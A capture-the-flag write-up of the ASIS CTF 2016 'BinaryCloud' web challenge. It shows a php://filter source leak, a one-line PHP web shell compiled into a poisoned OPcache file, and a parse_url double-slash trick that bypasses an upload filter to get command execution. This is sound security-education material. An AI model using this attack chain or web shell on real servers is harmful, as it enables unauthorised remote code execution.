---
id: 722
title: 'ASIS CTF 2016 - BinaryCloud - Web Challenge'
date: 2016-05-09T12:09:51+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=722
permalink: /asis-ctf-2016-binarycloud-web-challenge/
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
post_views_count:
  - "4581"
image: /images/2016/05/banner.jpg
categories:
  - Write-Ups
tags:
  - asis
  - opcache
  - php7
---
Cool challenge this one based on an interesting article published recently. We're given the following clue

<img src="/images/2016/05/binarycloud.png" alt="binarycloud" width="605" height="413" class="alignnone size-full wp-image-724" srcset="/images/2016/05/binarycloud.png 605w, /images/2016/05/binarycloud-300x205.png 300w" sizes="(max-width: 605px) 100vw, 605px" />

The link takes us to a ordinary looking "File Upload Challenge" website but this one has a difference under the hood. A brief recon gives us the following links in robots.txt:


```
User-Agent: *
Disallow: /
Disallow: /debug.php
Disallow: /cache
Disallow: /uploads
```


Visiting <a href="https://binarycloud.asis-ctf.ir/debug.php" target="_blank">debug.php</a> we see the full `phpinfo();` output. Very important for later:

<img src="/images/2016/05/binarycloud4.png" alt="binarycloud4" width="1147" height="823" class="alignnone size-full wp-image-727" srcset="/images/2016/05/binarycloud4.png 1147w, /images/2016/05/binarycloud4-300x215.png 300w, /images/2016/05/binarycloud4-768x551.png 768w, /images/2016/05/binarycloud4-1024x735.png 1024w" sizes="(max-width: 1147px) 100vw, 1147px" />

We notice a couple of things here, that we're running php7 and that Zend OPCache is enabled. Keep those in mind too. Next we suspect the `?page=` parameter and using this find that we can trivially leak the source code for the website using php filters. For example:

https://binarycloud.asis-ctf.ir/?page=php://filter/convert.base64-encode/resource=upload

We leak the pages:

  * index.php
  * home.php
  * debug.php
  * upload.php

We examine the source code for each and find an interesting code path in upload.php:


```
filter_directory();

if($_SERVER['QUERY_STRING'] && $_FILES['file']['name']){
    if(!file_exists($_SERVER['QUERY_STRING'])) error("error3");
    $name = preg_replace("/[^a-zA-Z0-9\.]/", "", basename($_FILES['file']['name']));
    if(ew($name, ".php")) error("error");
    $filename = $_SERVER['QUERY_STRING'] . "/" . $name;

```


The function `ew()` is short for `endswith()` and prevents us from uploading .php scripts directly. However we can control QUERY_STRING so we can decide where to place the file on the filesystem. Starting to make sense? No? Read on!

If you read up on this article you'll see we've got all of the ingredients needed to upload a binary web shell here.

  * <a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank">http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</a>

Before we continue though we need to double check the `filter_directory()` function:


```
function filter_directory(){
    $data = parse_url($_SERVER['REQUEST_URI']);
    $filter = ["cache", "binarycloud"];
    foreach($filter as $f){
        if(preg_match("/".$f."/i", $data['query'])){
            die("Attack Detected");
        }
    }   
}

```


Ok so we understand what we need to target and our approximate attack path now. In order to carry out this attack we do the following.

First, stand up our own PHP7 webserver with OPCache enabled. I spun up an Amazon Linux EC2 instance for this and followed a web how-to. It worked sufficiently well.

Next, we need to set our server environment up similarly to the target host. We know the opcache paths because we can read them in the `phpinfo();` output.

<img src="/images/2016/05/opcache.png" alt="opcache" width="964" height="46" class="alignnone size-full wp-image-730" srcset="/images/2016/05/opcache.png 964w, /images/2016/05/opcache-300x14.png 300w, /images/2016/05/opcache-768x37.png 768w" sizes="(max-width: 964px) 100vw, 964px" />

So I create these paths as well and place my backdoor PHP file which I called `home.php` in `/home/binarycloud/www`. The contents of my backdoor is simply:


```
< ?php system($_GET['c']); ? >
```


Then I set the webserver DocumentRoot to `/home/binarycloud/www`. When all this is done I simply poke my own server with `curl -v localhost/home.php` and it generates me a binary cache version of our backdoor home.php called home.php.bin. 

Next we need to extract the CTF server's system ID. We do this using <a href="https://github.com/GoSecure/php7-opcache-override/blob/master/system_id_scraper.py" target="_blank">the tool</a> developed by the GoSecure guys. You can check out the repo here: <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank">https://github.com/GoSecure/php7-opcache-override</a>. 


```
root@kali:~/asis/web/binarycloud/php7-opcache-override# python system_id_scraper.py http://binarycloud.asis-ctf.ir/debug.php
PHP version : 7.0.4-7ubuntu2
Zend Extension ID : API320151012,NTS
Zend Bin ID : BIN_SIZEOF_CHAR48888
Assuming x86_64 architecture
------------
System ID : 81d80d78c6ef96b89afaadc7ffc5d7ea

```


Once we have that we can use a hex editor to modify the system ID in our home.php.bin file.

<img src="/images/2016/05/hexed.png" alt="hexed" width="742" height="192" class="alignnone size-full wp-image-731" srcset="/images/2016/05/hexed.png 742w, /images/2016/05/hexed-300x78.png 300w" sizes="(max-width: 742px) 100vw, 742px" />

Ok so now we are finally ready to turn our sights on delivering the payload! We know from the article that we need to place our home.php.bin file directly into the cache path. So I use the web form to upload our .bin file. It will successfully bypass the .php file filter because thankfully it `endswith()` .bin now! I set the upload path to the absolute path value: `/home/binarycloud/www/cache/81d80d78c6ef96b89afaadc7ffc5d7ea/home/binarycloud/www/` using BurpSuite. 

Now - how to bypass the `filter_directory();` function? Well there's a tricky part here we learned during this CTF. There's a bug in the way PHP will parse relative URLs that begin with multiple slashes (e.g. `//`). If a relative URI is sent and the path begins with `//` then any query string will incorrectly wind up in the path instead. Here's an demonstration of how it works:


```
<?php
// single slash case
$uri = "/upload?/home/binarycloud/";
$data = parse_url($uri);
print_r($data);

// doubleslash case
$uri = "//upload?/home/binarycloud/";
$data = parse_url($uri);
print_r($data);
?>
```


And the output:


```
[root@ip-172-31-11-31 www]# php -v
PHP 7.0.6 (cli) (built: May  1 2016 12:13:47) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies
[root@ip-172-31-11-31 www]# php parse_url.php 
Array
(
    [path] => /upload
    [query] => /home/binarycloud/
)
Array
(
    [host] => upload?
    [path] => /home/binarycloud/
)

```


So our final payload in BurpSuite looks like this:

<img src="/images/2016/05/payload.png" alt="payload" width="891" height="333" class="alignnone size-full wp-image-732" srcset="/images/2016/05/payload.png 891w, /images/2016/05/payload-300x112.png 300w, /images/2016/05/payload-768x287.png 768w" sizes="(max-width: 891px) 100vw, 891px" />

To which we are greeted with a success message (yay!) and finally, successful command execution.

<img src="/images/2016/05/uploadsuccess.png" alt="uploadsuccess" width="995" height="256" class="alignnone size-full wp-image-733" srcset="/images/2016/05/uploadsuccess.png 995w, /images/2016/05/uploadsuccess-300x77.png 300w, /images/2016/05/uploadsuccess-768x198.png 768w" sizes="(max-width: 995px) 100vw, 995px" />

<img src="/images/2016/05/id.png" alt="id" width="625" height="236" class="alignnone size-full wp-image-734" srcset="/images/2016/05/id.png 625w, /images/2016/05/id-300x113.png 300w" sizes="(max-width: 625px) 100vw, 625px" />

And finally, after sleuthing a little bit to find the old flag:

<img src="/images/2016/05/flag.png" alt="flag" width="603" height="170" class="alignnone size-full wp-image-735" srcset="/images/2016/05/flag.png 603w, /images/2016/05/flag-300x85.png 300w, /images/2016/05/flag-600x170.png 600w" sizes="(max-width: 603px) 100vw, 603px" />